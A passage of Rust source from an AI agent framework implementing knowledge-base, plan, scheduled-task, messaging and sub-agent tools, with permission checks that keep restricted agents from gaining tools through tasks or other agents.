    Ok(serde_json::json!({"id": id, "created": created}).to_string())
}

fn tool_kb_search(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        query: String,
        #[serde(default)]
        tag: Option<String>,
        #[serde(default)]
        limit: Option<usize>,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let limit = params.limit.unwrap_or(8).clamp(1, 50);
    let hits = ctx.db()?.kb_search(
        &params.query,
        &kb_viewer(ctx)?,
        params.tag.as_deref(),
        limit,
    )?;
    ctx.println(&format!("🔎 {} note(s) for '{}'", hits.len(), params.query));
    if hits.is_empty() {
        return Ok("No notes match.".to_string());
    }
    Ok(hits
        .iter()
        .map(|hit| {
            let tags = if hit.note.tags.is_empty() {
                String::new()
            } else {
                format!(" [{}]", hit.note.tags.join(", "))
            };
            format!(
                "#{} {}{}\n    {}",
                hit.note.id,
                hit.note.title,
                tags,
                hit.snippet.replace('\n', " ")
            )
        })
        .collect::<Vec<_>>()
        .join("\n"))
}

fn tool_kb_read(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        #[serde(default)]
        id: Option<i64>,
        #[serde(default)]
        title: Option<String>,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let db = ctx.db()?;
    let viewer = kb_viewer(ctx)?;
    let note = match (params.id, &params.title) {
        (Some(id), _) => db.kb_get(id, &viewer)?,
        (None, Some(title)) => db.kb_get_by_title(title, &viewer)?,
        (None, None) => return Err("give the note's id or title".into()),
    };
    match note {
        Some(note) => {
            ctx.println(&format!("📒 note #{}: {}", note.id, note.title));
            Ok(format_kb_note(&note))
        }
        None => Ok("No such note.".to_string()),
    }
}

fn tool_kb_list(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        #[serde(default)]
        tag: Option<String>,
        #[serde(default)]
        limit: Option<usize>,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let limit = params.limit.unwrap_or(20).clamp(1, 200);
    let notes = ctx
        .db()?
        .kb_list(&kb_viewer(ctx)?, params.tag.as_deref(), limit)?;
    ctx.println(&format!("📒 {} note(s)", notes.len()));
    if notes.is_empty() {
        return Ok("The knowledge base is empty.".to_string());
    }
    Ok(notes
        .iter()
        .map(|n| {
            let tags = if n.tags.is_empty() {
                String::new()
            } else {
                format!(" [{}]", n.tags.join(", "))
            };
            format!("#{} {}{} (updated {})", n.id, n.title, tags, n.updated_at)
        })
        .collect::<Vec<_>>()
        .join("\n"))
}

fn tool_kb_delete(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        id: i64,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let viewer = kb_viewer(ctx)?;
    if let Some(note) = ctx.db()?.kb_get(params.id, &viewer)? {
        check_may_change_note(ctx, &note)?;
    }
    let deleted = ctx.db()?.kb_delete(params.id, &viewer)?;
    if deleted {
        ctx.println(&format!("🗑 Deleted note #{}", params.id));
    }
    Ok(serde_json::json!({"deleted": deleted, "id": params.id}).to_string())
}

/// `agent_data` key holding an agent's current plan (a JSON list of
/// `PlanItem`), alongside the existing `config:*` keys.
const PLAN_DATA_KEY: &str = "state:plan";

#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq)]
#[serde(rename_all = "snake_case")]
enum PlanStatus {
    Pending,
    InProgress,
    Completed,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
struct PlanItem {
    content: String,
    status: PlanStatus,
}

fn validate_plan(items: &[PlanItem]) -> Result<(), String> {
    if items.iter().any(|i| i.content.trim().is_empty()) {
        return Err("plan items must have non-empty content".to_string());
    }
    let in_progress = items
        .iter()
        .filter(|i| i.status == PlanStatus::InProgress)
        .count();
    if in_progress > 1 {
        return Err(format!(
            "at most one plan item can be in_progress at a time, got {}",
            in_progress
        ));
    }
    Ok(())
}

/// A plan with nothing left to do is as good as no plan - it's cleared
/// rather than kept around to clutter the status bar.
fn plan_is_finished(items: &[PlanItem]) -> bool {
    items.iter().all(|i| i.status == PlanStatus::Completed)
}

/// One-line progress summary for the status bar: completed/total and the
/// item being worked on (or the next pending one). `None` if there's no
/// active plan.
fn plan_summary(items: &[PlanItem]) -> Option<String> {
    if plan_is_finished(items) {
        return None;
    }
    let completed = items
        .iter()
        .filter(|i| i.status == PlanStatus::Completed)
        .count();
    let current = items
        .iter()
        .find(|i| i.status == PlanStatus::InProgress)
        .or_else(|| items.iter().find(|i| i.status == PlanStatus::Pending))?;
    Some(format!(
        "Plan {}/{}: {}",
        completed,
        items.len(),
        current.content
    ))
}

fn format_plan(items: &[PlanItem]) -> Vec<String> {
    items
        .iter()
        .map(|i| {
            let mark = match i.status {
                PlanStatus::Pending => "[ ]",
                PlanStatus::InProgress => "[>]",
                PlanStatus::Completed => "[x]",
            };
            format!("{} {}", mark, i.content)
        })
        .collect()
}

fn load_plan(db: &dyn DbBackend, agent: &str) -> Result<Vec<PlanItem>, Box<dyn Error>> {
    match db.get_agent_data(agent, PLAN_DATA_KEY)? {
        Some(value) => Ok(serde_json::from_str(&value)?),
        None => Ok(Vec::new()),
    }
}

/// Stores `items` as `agent`'s plan, or removes the plan entirely if it's
/// empty or finished.
fn save_plan(db: &dyn DbBackend, agent: &str, items: &[PlanItem]) -> Result<(), Box<dyn Error>> {
    if plan_is_finished(items) {
        db.delete_agent_data(agent, PLAN_DATA_KEY)?;
    } else {
        db.set_agent_data(agent, PLAN_DATA_KEY, &serde_json::to_string(items)?)?;
    }
    Ok(())
}

/// Shows `agent`'s stored plan (if any) in the status bar. Best-effort: a
/// failed lookup just leaves no plan shown.
fn refresh_plan_status(status_bar: &status_bar::StatusBar, db: &dyn DbBackend, agent: &str) {
    let summary = load_plan(db, agent)
        .ok()
        .and_then(|items| plan_summary(&items));
    status_bar.set_agent_plan(agent, summary.as_deref());
}

/// The plan tools act on the calling agent's own plan (sub-agents
/// included). A context without an agent identity is refused rather than
/// falling back to some other agent's plan.
fn plan_agent(ctx: &ToolContext) -> Result<&str, Box<dyn Error>> {
    ctx.agent_name
        .as_deref()
        .ok_or_else(|| "plan tools require an agent identity".into())
}

fn tool_plan_update(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        items: Vec<PlanItem>,
    }
    let params: Params = serde_json::from_str(params_str)?;
    validate_plan(&params.items)?;
    let agent = plan_agent(ctx)?;
    let db = ctx.db()?;
    save_plan(db, agent, &params.items)?;

    let summary = plan_summary(&params.items);
    if let Some(sa_ctx) = ctx
        .extra
        .as_ref()
        .and_then(|e| e.downcast_ref::<SubAgentContext>())
    {
        sa_ctx.status_bar.set_agent_plan(agent, summary.as_deref());
    }
    for line in format_plan(&params.items) {
        ctx.println(&line);
    }
    let result = if summary.is_some() {
        serde_json::json!({"status": "ok", "items": params.items.len()})
    } else {
        serde_json::json!({"status": "ok", "cleared": true, "message": "Plan finished or empty; cleared."})
    };
    Ok(result.to_string())
}

fn tool_plan_get(_params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    let agent = plan_agent(ctx)?;
    let items = load_plan(ctx.db()?, agent)?;
    if items.is_empty() {
        ctx.println("(no active plan)");
    }
    for line in format_plan(&items) {
        ctx.println(&line);
    }
    Ok(serde_json::json!({ "items": items }).to_string())
}

/// entrypoint for the task_create tool: one task, run on a cron schedule,
/// once after a delay or at a time, or (with none of these) right away.
fn tool_task_create(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        name: String,
        command: String,
        #[serde(default)]
        description: Option<String>,
        #[serde(default)]
        agent_name: Option<String>,
        #[serde(default)]
        cron_expression: Option<String>,
        #[serde(default)]
        max_runs: Option<i64>,
        #[serde(default)]
        delay_seconds: Option<u64>,
        #[serde(default)]
        run_at: Option<String>,
        #[serde(default)]
        depends_on: Vec<i64>,
        #[serde(default)]
        profile: Option<String>,
        #[serde(default)]
        cwd: Option<String>,
    }
    let mut params: Params = serde_json::from_str(params_str)?;
    params.profile = requested_profile(&ctx_profiles(ctx), params.profile.take());
    // It runs where its maker works, unless one that may choose does.
    let cwd = child_cwd(ctx, params.cwd.as_deref())?;
    if params.command.trim().is_empty() {
        return Err("the task needs a command: an instruction, or a JSON tool call".into());
    }
    let schedule = match (
        &params.cron_expression,
        params.delay_seconds,
        &params.run_at,
    ) {
        (Some(expression), None, None) => db::TaskSchedule::Cron {
            expression: expression.clone(),
            max_runs: params.max_runs,
        },
        (None, delay, at) => {
            if params.max_runs.is_some() {
                return Err("max_runs only applies to a cron_expression task".into());
            }
            let at = match (delay, at) {
                (Some(_), Some(_)) => return Err("give delay_seconds or run_at, not both".into()),
                (Some(secs), None) => {
                    (chrono::Utc::now() + chrono::Duration::seconds(secs as i64)).to_rfc3339()
                }
                (None, Some(at)) => at.clone(),
                (None, None) => chrono::Utc::now().to_rfc3339(),
            };
            db::TaskSchedule::Once { at }
        }
        (Some(_), _, _) => {
            return Err("give cron_expression, or delay_seconds/run_at, not both".into());
        }
    };
    let kind = if db::is_tool_call(&params.command) {
        db::TaskKind::TOOL
    } else {
        db::TaskKind::PROMPT
    };
    let db = ctx.db()?;
    // A tool task runs a tool its maker has: an agent limited to some
    // tools doesn't get the others by scheduling them.
    if kind == db::TaskKind::TOOL {
        let tool = serde_json::from_str::<serde_json::Value>(&params.command)?["tool"]
            .as_str()
            .unwrap_or_default()
            .to_string();
        let allowed = match ctx.agent_name.as_deref() {
            Some(agent) => db.get_agent_config(agent)?.tools,
            None => None,
        };
        if allowed.is_some_and(|tools| !tools.contains(&tool)) {
            return Err(format!(
                "you don't have the {} tool, so a task can't run it for you",
                tool
            )
            .into());
        }
    }
    // Without a profile, it runs on the agent creating it unless told
    // otherwise - if that's an agent a session runs (a chat's, a
    // worker's): a sub-agent's or a task's agent isn't one any session
    // picks tasks up for, so theirs go to any agent.
    let creator_runs_tasks = ctx.agent_name.as_deref().is_some_and(|name| {
        db.get_agent(name)
            .ok()
            .flatten()
            .is_some_and(|a| a.parent.is_none())
    });
    let agent_name = match &params.profile {
        Some(_) => params.agent_name.clone(),
        None => params
            .agent_name
            .clone()
            .or_else(|| ctx.agent_name.clone().filter(|_| creator_runs_tasks)),
    };
    let task = db::NewTask {
        name: params.name.clone(),
        description: params.description.unwrap_or_default(),
        kind: kind.to_string(),
        command: params.command,
        agent_name,
        schedule,
        held: false,
        depends_on: params.depends_on,
        profile: params.profile,
        // Whoever picks it up, it can't do more than its maker could.
        run_safe: !ctx.unsafe_tools,
        cwd,
    };
    let id = db.create_task(&task)?;
    let next_run = db.get_task(id)?.and_then(|t| t.next_run_at);
    ctx.println(&format!(
        "Created {} task '{}' (id={}), next run {}",
        kind,
        task.name,
        id,
        next_run.as_deref().unwrap_or("-")
    ));
    let mut result = serde_json::json!({
        "id": id,
        "kind": kind,
        "next_run_at": next_run,
        "runs_on": task.agent_name.clone().unwrap_or_else(|| match &task.profile {
            Some(profile) => format!("a new agent from profile {}", profile),
            None => "any agent".to_string(),
        }),
    });
    // What a model waiting for it needs to know.
    let note = match task.agent_name.as_deref() {
        Some(agent) if Some(agent) == ctx.agent_name.as_deref() => Some(
            "It runs on you, once you're idle: it can't start while this turn goes on, so \
             don't wait for it - end your turn."
                .to_string(),
        ),
        Some(agent) => match db.get_agent(agent)? {
            Some(a) if db::agent_session_is_live(&a, chrono::Utc::now()) => None,
            _ => Some(format!(
                "No session is running '{}' now: the task waits until one does.",
                agent
            )),
        },
        None if kind == db::TaskKind::PROMPT => {
            Some("Use task_wait to wait for it and get its result.".to_string())
        }
        None => None,
    };
    if let Some(note) = note {
        result["note"] = note.into();
    }
    Ok(result.to_string())
}

/// entrypoint for the task_wait tool: waits for tasks to finish their
/// (next) run and returns how each went.
fn tool_task_wait(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        ids: Vec<i64>,
        #[serde(default)]
        timeout_seconds: Option<u64>,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let db = ctx.db()?;
    if params.ids.is_empty() {
        return Err("give the ids of the tasks to wait for".into());
    }
    // Where each stands now: done once it's finished a run since.
    let mut started = HashMap::new();
    for id in &params.ids {
        let task = db
            .get_task(*id)?
            .ok_or_else(|| format!("no task #{}", id))?;
        if ctx.task_id == Some(*id) {
            return Err(format!(
                "task #{} is the task you are running right now - it shows as running because \
                 of you, so waiting for it would never end. Do the work yourself, then end your \
                 turn.",
                id
            )
            .into());
        }
        if task.agent_name.is_some()
            && task.agent_name == ctx.agent_name
            && task.status != db::TaskStatus::RUNNING
        {
            return Err(format!(
                "task #{} runs on you, once you're idle: it can't start while you wait for it - \
                 end your turn instead",
                id
            )
            .into());
        }
        started.insert(*id, task.run_count);
    }
    let finished = |task: &db::TaskRow| {
        task.status != db::TaskStatus::RUNNING
            && (task.run_count > started[&task.id] || task.status == db::TaskStatus::DONE)
    };
    let deadline =
        std::time::Instant::now() + Duration::from_secs(params.timeout_seconds.unwrap_or(600));
    let tasks = loop {
        let tasks: Vec<db::TaskRow> = params
            .ids
            .iter()
            .filter_map(|id| db.get_task(*id).ok().flatten())
            .collect();
        if tasks.iter().all(|t| finished(t)) || std::time::Instant::now() >= deadline {
            break tasks;
        }
        if let Some(db) = &ctx.db {
            let waiting: Vec<String> = tasks
                .iter()
                .filter(|t| !finished(t))
                .map(|t| format!("#{}", t.id))
                .collect();
            let _ = db.set_agent_activity(
                ctx.agent_name.as_deref().unwrap_or("default"),
                &format!("waiting for task {}", waiting.join(", ")),
            );
        }
        for _ in 0..10 {
            let interrupted = ctx.interrupt.as_ref().is_some_and(|rx| {
                rx.lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .try_recv()
                    .is_ok()
            });
            if interrupted {
                return Err(Box::new(InterruptedError::new(
                    "Operation interrupted by user",
                )));
            }
            std::thread::sleep(Duration::from_millis(100));
        }
    };
    let mut out = String::new();
    for task in &tasks {
        let task = &task_view(task, ctx);
        out.push_str(&format!("## Task #{} \"{}\"\n", task.id, task.name));
        if finished(task) {
            out.push_str(&format!(
                "{}: {}\n\n",
                task.last_outcome.as_deref().unwrap_or("done"),
                task.last_result.as_deref().unwrap_or("").trim()
            ));
        } else {
            out.push_str(&format!("(still {} - gave up waiting)\n\n", task.status));
        }
    }
    Ok(out)
}

/// entrypoint for the task_list tool: tasks (an agent's, or only the due
/// ones), or one task by id.
fn tool_task_list(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        #[serde(default)]
        id: Option<i64>,
        #[serde(default)]
        agent_name: Option<String>,
        #[serde(default)]
        profile: Option<String>,
        #[serde(default)]
        due: bool,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let db = ctx.db()?;
    if let Some(id) = params.id {
        return match db.get_task(id)? {
            Some(task) => {
                ctx.println(&format!(
                    "Task [{}]: {} ({})",
                    task.id, task.name, task.status
                ));
                Ok(serde_json::to_string(&mark_own_task(&task, ctx)?)?)
            }
            None => Ok(serde_json::json!({"error": format!("no task with id {}", id)}).to_string()),
        };
    }
    let mut tasks = if params.due {
        db.get_pending_tasks()?
    } else {
        db.list_tasks(params.agent_name.as_deref())?
    };
    if let (true, Some(agent)) = (params.due, params.agent_name.as_deref()) {
        tasks.retain(|t| t.agent_name.as_deref() == Some(agent));
    }
    if let Some(profile) = params.profile.as_deref() {
        tasks.retain(|t| t.profile.as_deref() == Some(profile));
    }
    ctx.println(&format!("Found {} task(s)", tasks.len()));
    for t in &tasks {
        let last = t
            .last_outcome
            .as_deref()
            .map(|o| format!(", last run {}", o))
            .unwrap_or_default();
        ctx.println(&format!(
            "  [{}] {} - {} {} ({}{})",
            t.id, t.name, t.kind, t.task_type, t.status, last
        ));
    }
    let tasks = tasks
        .iter()
        .map(|t| mark_own_task(t, ctx))
        .collect::<Result<Vec<_>, _>>()?;
    Ok(serde_json::to_string(&tasks)?)
}

/// A task as task_list shows it - saying so if it's the one the caller is
/// running: otherwise a model sees it "running", claimed by some session,
/// and waits for whoever that is - itself.
fn mark_own_task(
    task: &db::TaskRow,
    ctx: &ToolContext,
) -> Result<serde_json::Value, Box<dyn Error>> {
    let mut value = serde_json::to_value(task_view(task, ctx))?;
    if ctx.task_id == Some(task.id) {
        value["note"] = "This is the task you are running right now: it shows as running \
                         because of you. Do the work yourself; don't wait for it."
            .into();
    }
    Ok(value)
}

fn tool_task_delete(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        id: i64,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let db = ctx.db()?;
    if let Some(task) = db.get_task(params.id)? {
        check_may_change_task(ctx, &task)?;
    }
    let deleted = db.delete_task(params.id)?;
    if deleted {
        ctx.println(&format!("Deleted task id={}", params.id));
    }
    let result = serde_json::json!({"deleted": deleted, "id": params.id});
    Ok(result.to_string())
}

fn tool_task_set_enabled(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        id: i64,
        enabled: bool,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let db = ctx.db()?;
    if let Some(task) = db.get_task(params.id)? {
        check_may_change_task(ctx, &task)?;
    }
    let updated = db.set_task_enabled(params.id, params.enabled)?;
    let status = db.get_task(params.id)?.map(|t| t.status);
    if updated {
        ctx.println(&format!(
            "Task id={} {}",
            params.id,
            if params.enabled {
                "enabled"
            } else {
                "disabled"
            }
        ));
    }
    let mut result = serde_json::json!({"updated": updated, "id": params.id, "status": status});
    if !updated {
        result["reason"] = match status.as_deref() {
            None => "no such task".into(),
            Some(db::TaskStatus::DONE) => {
                "the task is done; create a new one to run it again".into()
            }
            Some(db::TaskStatus::HELD) if params.enabled => {
                "the task is on hold; the user releases it with `faber tasks release`".into()
            }
            Some(other) => format!("the task is already {}", other).into(),
        };
    }
    Ok(result.to_string())
}

/// entrypoint for the task_assign tool: changes where a task runs - on an
/// agent, on a new agent made from a profile, or on any agent.
fn tool_task_assign(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        id: i64,
        #[serde(default)]
        agent_name: Option<String>,
        #[serde(default)]
        profile: Option<String>,
    }
    let mut params: Params = serde_json::from_str(params_str)?;
    params.profile = requested_profile(&ctx_profiles(ctx), params.profile.take());
    let db = ctx.db()?;
    if let Some(task) = db.get_task(params.id)? {
        check_may_change_task(ctx, &task)?;
    }
    let updated = db.set_task_target(
        params.id,
        params.agent_name.as_deref(),
        params.profile.as_deref(),
    )?;
    let task = db.get_task(params.id)?;
    let mut result = serde_json::json!({"updated": updated, "id": params.id});
    match (&task, updated) {
        (Some(task), true) => {
            let target = task_target(task);
            ctx.println(&format!("Task id={} now runs on {}", params.id, target));
            result["runs_on"] = target.into();
        }
        (Some(task), false) => {
            result["reason"] = format!("the task is {} already", task.status).into();
        }
        (None, _) => result["reason"] = "no such task".into(),
    }
    Ok(result.to_string())
}

/// send_message as agents without the unsafe tools have it: only to
/// agents without them too - asking one that has them to use them would
/// be a way around not having them. Like run_command, which version an
/// agent gets is decided with its tools (see `initialize_tools`).
fn tool_send_message_safe(
    params_str: &String,
    ctx: &ToolContext,
) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        to: String,
    }
    let to = serde_json::from_str::<Params>(params_str)?.to;
    if agent_is_unsafe(ctx.db()?, &to)? {
        return Err(format!(
            "'{}' has the unsafe tools: you can only send messages to agents that don't. Ask \
             the user instead",
            to
        )
        .into());
    }
    tool_send_message(params_str, ctx)
}

fn tool_send_message(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        to: String,
        message: String,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let from = ctx.agent_name.as_deref().unwrap_or("default");
    let db = ctx.db()?;
    if db.get_agent(from)?.is_none() {
        return Err(format!("messages come from an agent, and '{}' isn't one", from).into());
    }
    let id = db.send_notification(from, &params.to, &params.message)?;
    ctx.println(&format!(
        "Message sent to agent '{}' (notification #{})",
        params.to, id
    ));
    let result = serde_json::json!({"status": "sent", "id": id, "from": from, "to": params.to});
    Ok(result.to_string())
}

/// entrypoint for the agent_wait tool: waits for the caller's sub-agents
/// to finish - all, the named ones, or the first one - and returns their
/// results, which then aren't also delivered as messages.
fn tool_agent_wait(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        #[serde(default)]
        names: Option<Vec<String>>,
        #[serde(default)]
        any: bool,
        #[serde(default)]
        timeout_seconds: Option<u64>,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let sa_ctx = ctx
        .extra
        .as_ref()
        .and_then(|e| e.downcast_ref::<SubAgentContext>())
        .ok_or("Sub-agent context not configured")?;
    let caller = ctx.agent_name.as_deref().unwrap_or("default");
    let runs = &sa_ctx.runs;
    let wanted = |run: &SubAgentRun| {
        run.parent == caller
            && !run.delivered
            && params
                .names
                .as_ref()
                .is_none_or(|names| names.contains(&run.name))
    };
    let mut state = runs.runs.lock().unwrap_or_else(|e| e.into_inner());
    let targets: Vec<u64> = state
        .iter()
        .filter(|(_, run)| wanted(run))
        .map(|(id, _)| *id)
        .collect();
    if targets.is_empty() {
        // Not a failure - there's just nothing left to wait for, e.g. after
        // fan_out, which hands back its results itself.
        return Ok(match &params.names {
            Some(names) => format!(
                "Nothing to wait for: none of {} is a sub-agent of yours with a result still \
                 to collect (already collected, or never started with spawn_agent).",
                names.join(", ")
            ),
            None => "Nothing to wait for: you have no sub-agents with results still to collect. \
                     (fan_out returns its results directly, as its own result; agent_wait is only \
                     for sub-agents started with spawn_agent.)"
                .to_string(),
        });
    }
    let names: Vec<String> = targets.iter().map(|id| state[id].name.clone()).collect();
    ctx.println(&format!("Waiting for {}...", names.join(", ")));
    if let Some(db) = &ctx.db {
        let _ = db.set_agent_activity(caller, &format!("waiting for {}", names.join(", ")));
    }
    let deadline =
        std::time::Instant::now() + Duration::from_secs(params.timeout_seconds.unwrap_or(600));
    loop {
        let done = targets
            .iter()
            .filter(|id| state[id].result.is_some())
            .count();
        if done == targets.len() || (params.any && done > 0) {
            break;
        }
        let now = std::time::Instant::now();
        if now >= deadline {
            break;
        }
        state = runs
            .finished
            .wait_timeout(state, (deadline - now).min(Duration::from_millis(100)))
            .unwrap_or_else(|e| e.into_inner())
            .0;
        let interrupted = ctx.interrupt.as_ref().is_some_and(|rx| {
            rx.lock()
                .unwrap_or_else(|e| e.into_inner())
                .try_recv()
                .is_ok()
        });
        if interrupted {
            return Err(Box::new(InterruptedError::new(
                "Operation interrupted by user",
            )));
        }
    }
    let mut out = String::new();
    for id in &targets {
        let run = state.get_mut(id).expect("targets come from the map");
        match &run.result {
            Some(result) => {
                run.delivered = true;
                out.push_str(&format!("## {}\n{}\n\n", run.name, result.trim()));
            }
            None => out.push_str(&format!("## {}\n(still running)\n\n", run.name)),
        }
    }
    Ok(out)
}

/// entrypoint for the agent_cancel tool: stops a running sub-agent the
/// caller started, directly or through its own sub-agents.
fn tool_agent_cancel(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        name: String,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let sa_ctx = ctx
        .extra
        .as_ref()
        .and_then(|e| e.downcast_ref::<SubAgentContext>())
        .ok_or("Sub-agent context not configured")?;
    let caller = ctx.agent_name.as_deref().unwrap_or("default");
    let lineage = ctx.db()?.agent_lineage(&params.name)?;
    if params.name == caller || !lineage.iter().any(|a| a == caller) {
        return Err(format!(
            "can only cancel sub-agents you started (or they did); '{}' isn't one",
            params.name
        )
        .into());
    }
    if !stop_sub_agent(
        &sa_ctx.running_subagents,
        &params.name,
        &format!("cancelled by {}", caller),
    ) {
        return Err(format!("no sub-agent named '{}' is running", params.name).into());
    }
    ctx.println(&format!("Cancelling sub-agent '{}'", params.name));
    Ok(serde_json::json!({"cancelled": params.name}).to_string())
}

/// How deep sub-agents may nest: a sub-agent of a sub-agent of ... - so a
/// task that keeps delegating ends instead of recursing forever.
const MAX_AGENT_DEPTH: usize = 8;

fn tool_spawn_agent(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        name: String,
        prompt: String,
        /// Stop it if it's still working after this long.
        #[serde(default)]
        timeout_seconds: Option<u64>,
        /// Stop it once it has made this many requests to the model.
        #[serde(default)]
        max_requests: Option<usize>,
        /// The data it must report with `report_result` (see
        /// `validate_result_data`).
        #[serde(default)]
        result_schema: Option<serde_json::Value>,
        /// Knowledge base notes and files to hand it up front.
        #[serde(default)]
        context: Option<Handoff>,
        /// Make it from this profile.
        #[serde(default)]
        profile: Option<String>,
        /// Give it the unsafe tools, or not; default: as the caller.
        #[serde(default)]
        unsafe_tools: Option<bool>,
        /// Where it works; default: where the caller does.
        #[serde(default)]
        cwd: Option<String>,
    }
    let mut params: Params = serde_json::from_str(params_str)?;
    params.profile = requested_profile(&ctx_profiles(ctx), params.profile.take());

    let sa_ctx = ctx
        .extra
        .as_ref()
        .and_then(|e| e.downcast_ref::<SubAgentContext>())
        .ok_or("Sub-agent context not configured")?;

    let profile = params
        .profile
        .as_deref()
        .map(|name| find_profile(&sa_ctx.profiles, name).map(|p| (name, p)))
        .transpose()?;
    let db = ctx.db.clone().ok_or("Database required for sub-agents")?;
    let parent_agent = ctx.agent_name.clone().unwrap_or("default".to_string());

    let agent_name = params.name.clone();
    let prompt = params.prompt.clone();
    if sa_ctx
        .running_subagents
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .contains_key(&agent_name)
    {
        return Err(format!("a sub-agent named '{}' is already running", agent_name).into());
    }

    let agent_config = {
        let existing = db.get_agent(&agent_name)?;
        if existing.is_some() && !db.claim_agent(&agent_name, &sa_ctx.session_id)? {
            return Err(format!("'{}' is in use by another session", agent_name).into());
        }
        let unsafe_tools = match &existing {
            Some(_) => {
                check_may_change(ctx, db.as_ref(), &agent_name)?;
                let stored = db.get_agent_config(&agent_name)?.unsafe_tools;
                child_unsafe(ctx.unsafe_tools, params.unsafe_tools.or(stored))?
            }
            None => child_unsafe(ctx.unsafe_tools, params.unsafe_tools)?,
        };
        let mut cwd = child_cwd(ctx, params.cwd.as_deref())?;
        if existing.is_some() && params.cwd.is_none() {
            let stored = db.get_agent_config(&agent_name)?.cwd;
            if stored.is_some() && stored != cwd {
                // Another directory, set by the user: only an agent that
                // could have chosen it itself may run it there.
                if !ctx.unsafe_tools {
                    return Err(format!(
                        "'{}' works in {}, not where you do: pick another name",
                        agent_name,
                        stored.unwrap_or_default()
                    )
                    .into());
                }
                cwd = stored;
            }
        }
        if let (Some(_), Some((name, _))) = (&existing, profile) {
            let current = db.get_agent_config(&agent_name)?.profile;
            if current.as_deref() != Some(name) {
                return Err(format!(
                    "'{}' already exists, made from {}: give it no profile, or use a new name",
                    agent_name,
                    current
                        .map(|p| format!("profile '{}'", p))
                        .unwrap_or_else(|| "no profile".to_string())
                )
                .into());
            }
        }
        if existing.is_none() {
            match profile {
                Some((name, settings)) => {
                    apply_profile(db.as_ref(), &agent_name, name, settings)?;
                }
                None => db.create_agent(&agent_name, &format!("Sub-agent: {}", agent_name))?,
            }
        }
        let depth = db.agent_lineage(&parent_agent)?.len();
        if depth >= MAX_AGENT_DEPTH {
            return Err(format!(
                "'{}' is already {} levels deep in sub-agents; can't go deeper",
                parent_agent, depth
            )
            .into());
        }
        // Lets it see the knowledge base notes private to its parent (and
        // so on up), while what it saves privately stays below.
        db.set_agent_parent(&agent_name, Some(&parent_agent))?;
        set_agent_unsafe(db.as_ref(), &agent_name, unsafe_tools)?;
        set_agent_cwd(db.as_ref(), &agent_name, cwd)?;
        if !db.claim_agent(&agent_name, &sa_ctx.session_id)? {
            return Err(format!("'{}' is in use by another session", agent_name).into());
        }
        db.get_agent_config(&agent_name)?
    };
    let sub_unsafe = agent_config.unsafe_tools == Some(true);
    let sub_cwd = agent_config.cwd.clone().map(PathBuf::from);
    let task_id = ctx.task_id;

    let agent_opts = with_agent_config(&sa_ctx.opts, &agent_config);
    let tools = Arc::new(agent_tools(&sa_ctx.tools, sub_unsafe, &agent_config));

    let mut messages: Vec<Message> = vec![
        make_message(
            "system",
            format!(
                "You are a sub-agent named '{}'. Complete the task and return a concise result.",
                agent_name
            ),
        ),
        working_directory_note(
            &sub_cwd
                .clone()
                .unwrap_or_else(|| std::env::current_dir().unwrap_or_default()),
        ),
    ];
    if let Some(ref sp) = agent_config.system_prompt {
        messages.push(make_message("system", sp.clone()));
    }
    if let Some(handoff) =
        handoff_message(ctx, params.context.as_ref().unwrap_or(&Handoff::default()))?
    {
        messages.push(handoff);
    }
    messages.push(make_message(
        "user",
        delegated_prompt(&prompt, params.result_schema.as_ref()),
    ));
    let result_schema = params.result_schema.clone();

    ctx.println(&format!("Spawning sub-agent '{}'...", agent_name));

    let active_counter = sa_ctx.active_subagents.clone();
    active_counter.fetch_add(1, std::sync::atomic::Ordering::Relaxed);

    let sub_status_bar = sa_ctx.status_bar.clone();
    let sub_status_bar_for_progress = sa_ctx.status_bar.clone();
    let agent_name_for_status = agent_name.clone();
    sub_status_bar.set_agent_status(&agent_name_for_status, "Running", true);
